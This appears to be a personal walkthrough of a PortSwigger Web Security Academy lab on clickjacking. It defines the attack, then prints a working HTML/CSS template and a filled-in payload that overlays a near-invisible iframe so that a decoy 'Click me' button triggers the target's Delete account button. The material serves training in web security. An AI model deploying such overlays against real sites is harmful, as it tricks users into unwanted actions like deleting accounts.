# Clickjacking

## What is clickjacking?

Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website. Consider the following example:

A web user accesses a decoy website (perhaps this is a link provided by an email) and clicks on a button to win a prize. Unknowingly, they have been deceived by an attacker into pressing an alternative hidden button and this results in the payment of an account on another site. 
This is an example of a clickjacking attack. The technique depends upon the incorporation of an invisible, actionable web page (or multiple pages) containing a button or hidden link, say, within an iframe. The iframe is overlaid on top of the user's anticipated decoy web page content. This attack differs from a [CSRF](https://portswigger.net/web-security/csrf) attack in that the user is required to perform an action such as a button click whereas a [CSRF attack](https://portswigger.net/web-security/csrf) depends upon forging an entire request without the user's knowledge or input.

## **[Lab: Basic clickjacking with CSRF token protection](CORS%200cd642a5a74f4c0aa3cc08ca99b57bc8.md)**

In this scenario, I will implement a clickjacking attack to trigger a button on the target website protected with the CSRF token.

To get started, I tried logging into the target website with my credentials as usual (`wiener:peter`). Here, I identify a potential 'selling' position is the Delete account button.

Then I swam over to the Exploit Server and inserted the HTML template containing the CSS Style below into the Body Section.

```jsx
<style>

    iframe {

        position:relative;

        width: $width_value;

        height: $height_value;

        opacity: $opacity;

        z-index: 2;

    }

    div {

        position:absolute;

        top: $top_value;

        left: $side_value;

        z-index: 1;

    }

</style>

<div>Click me</div>

<iframe src="$url"></iframe>
```

Once they are ready as above, I can confirm by hovering over the “Click me” button. If the pointer changes to a hand icon, my alignment is complete.

```jsx
<style>

    iframe {

        position:relative;

        width:200;

        height: 200;

        opacity: 0.0001;

        z-index: 2;

    }

    div {

        position:absolute;

        top: 150px;

        left: 70px;

        z-index: 1;

    }

</style>

<div>Click me</div>

<iframe src="https://0aef0067044a8630c10d178900890063.web-security-academy.net"></iframe>
```

To end the game, I'll need to click on Deliver exploit to victim. This would correspond to me sending an email containing a malicious link to the victim and then waiting for the target to bite
